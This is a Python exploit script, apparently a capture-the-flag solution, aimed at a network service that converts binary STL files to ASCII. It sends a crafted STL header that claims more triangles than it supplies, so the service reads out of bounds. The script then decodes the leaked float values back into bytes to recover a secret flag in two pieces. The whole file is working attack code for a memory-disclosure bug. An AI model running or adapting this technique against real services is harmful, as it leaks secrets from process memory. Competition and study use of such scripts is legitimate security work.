import subprocess
import struct
import sys
import socket
import time

STL_HEADER = b"a" * 80

def communicate_bin(data):
    path = "../source/service"
    proc = subprocess.Popen(path, cwd="../source", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    inp = str(len(data)).encode() + b'\n' + data
    return proc.communicate(inp)[0]

def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        time.sleep(0.1)
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data

def communicate_net(data):
    inp = str(len(data)).encode() + b'\n' + data
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))

    s.send(inp)

    return recvall(s)

communicate = communicate_net

def convert_stl(bin_stl):
    out = communicate(bin_stl)
    return out[out.find(b"solid"):]

def parse_stl(data):
    current_tri = None
    tris = []
    for line in data.split(b'\n'):
        if line[:13] == b"facet normal ":
            current_tri = []
            current_tri.append([float(x.decode()) for x in line[13:].split(b" ")])
        elif line[:7] == b"vertex ":
            current_tri.append([float(x.decode()) for x in line[7:].split(b" ")])
        elif line == b"endfacet":
            tris.append(current_tri)
            current_tri = None

    assert current_tri == None
    return tris

def flatten(nested):
    return [x for lst in nested for x in lst]

# no offset:
# len(header) + 4 + 0x50 * 50 = 0x1000 - 12
# [0x50]: floats[3:12] = flag[0:36]

f = STL_HEADER + struct.pack("I", 0x52)
print(f"Sending {f!r}", file=sys.stderr)
b = convert_stl(f)
print(b)
data = parse_stl(b)
print(f"data[0x50] = {data[0x50]!r}", file=sys.stderr)
flag_0_36 = struct.pack("9f", *flatten(data[0x50])[3:12])
print(f"flag[0:36] = {flag_0_36!r}", file=sys.stderr)


# offset = 5 * 9 = 45
# offset + len(header) + 4 + 0x50 * 50 = 0x1000 + 33
# [0x50]: floats[0:12] = flag[33:81]

f = b"solid" * 9 + STL_HEADER + struct.pack("I", 0x52)
print(f"Sending {f!r}", file=sys.stderr)
data = parse_stl(convert_stl(f))
print(f"data[0x50] = {data[0x50]!r}", file=sys.stderr)
flag_33_81 = struct.pack("12f", *flatten(data[0x50])[0:12])
print(f"flag[33:81] = {flag_33_81!r}", file=sys.stderr)

sys.stdout.buffer.write(flag_0_36 + flag_33_81[3:19])
